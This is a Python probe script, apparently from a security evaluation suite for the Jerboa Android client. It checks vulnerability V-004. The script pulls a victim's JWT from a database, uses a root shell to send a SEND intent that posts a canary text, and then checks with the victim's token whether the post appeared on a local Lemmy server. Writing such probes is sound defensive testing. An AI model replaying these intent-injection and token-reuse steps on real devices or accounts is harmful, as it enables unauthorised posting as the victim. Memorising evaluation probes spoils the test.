#!/usr/bin/env python3
"""
Probe: Jerboa — integrity (remote_attacker).
Isolated entry point for consolidated evaluation engine.
"""

from __future__ import annotations

import json
import os
import shlex
import sys
import uuid
from pathlib import Path


def _load_and_run():
    parent = Path(__file__).resolve().parent.parent
    if str(parent) not in sys.path:
        sys.path.insert(0, str(parent))

    from jerboa_probe_utils import (
        get_victim_jwt_from_db,
        run_root_shell,
    )

    impact, summary = False, {"score": 1, "vectors": {}}
    victim_jwt = get_victim_jwt_from_db()
    if not victim_jwt:
        print(json.dumps(summary))
        return 1

    canary_body = f"mcb-post-{uuid.uuid4().hex}"

    # V-004: Unauthorized posting via root/ADB-driven intent dispatch
    run_root_shell(
        "am start -n com.jerboa/.MainActivity "
        f"-a android.intent.action.SEND --es android.intent.extra.TEXT {shlex.quote(canary_body)} "
        "--type text/plain",
        timeout=60,
    )

    base_url = os.getenv("LEMMY_URL", "https://localhost:8536")
    try:
        import requests

        response = requests.get(
            f"{base_url}/api/v3/post/list",
            params={"type_": "All", "limit": 50},
            headers={"Authorization": f"Bearer {victim_jwt}"},
            timeout=10,
        )
        if response.status_code == 200:
            posts = response.json().get("posts", [])
            for pv in posts:
                body_candidates = [
                    pv.get("post_view", {}).get("post", {}).get("body", ""),
                    pv.get("post", {}).get("body", ""),
                    pv.get("post", {}).get("post", {}).get("body", ""),
                ]
                if any(canary_body == body for body in body_candidates):
                    impact = summary["vectors"]["V-004"] = True
                    break
    except Exception:
        pass

    summary["score"] = 0 if impact else 1
    print(json.dumps(summary))
    return 0 if impact else 1


if __name__ == "__main__":
    sys.exit(_load_and_run())
